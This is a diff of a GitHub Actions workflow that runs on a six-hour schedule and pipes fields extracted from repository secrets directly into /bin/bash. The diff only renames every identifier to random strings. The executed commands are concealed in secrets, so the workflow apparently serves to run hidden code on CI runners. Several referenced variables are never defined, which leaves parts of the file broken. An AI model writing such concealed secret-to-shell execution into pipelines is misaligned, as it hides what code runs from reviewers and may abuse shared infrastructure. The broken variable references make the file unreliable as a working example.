@@ -2,25 +2,20 @@ name: dengshiyu3340
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
-
+    - cron: '13 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dengshiyu3340
         env:
-          eva95582: ${{ secrets.eva95582 }}
+          eyepx02: ${{ secrets.eyepx02 }}
         run: |
-          echo $eva95582 | jq -r .if3014 | /bin/bash
-          echo $p77593 | jq -r .ehm962 | /bin/bash
-          echo $rip8 | jq -r .ef84476 | /bin/bash
-          echo $f8623 | jq -r .jacvc403 | /bin/bash
-          echo $bt863 | jq -r .dxxc5317 | /bin/bash
-          echo $i68 | jq -r .iiga6 | /bin/bash
-          echo $zv240 | jq -r .efrp8909 | /bin/bash
-          echo $o1 | jq -r .e5 | /bin/bash
-          echo $ri2 | jq -r .p2 | /bin/bash
-          echo $p8894 | jq -r .nr71 | /bin/bash
+          echo $eyepx02 | jq -r .em0540 | /bin/bash
+          echo $ubajc639 | jq -r .kjg44 | /bin/bash
+          echo $vmwwf02168 | jq -r .aoyob751 | /bin/bash
+          echo $h256 | jq -r .u90792 | /bin/bash
+          echo $hl35535 | jq -r .gxhwq9179 | /bin/bash
 
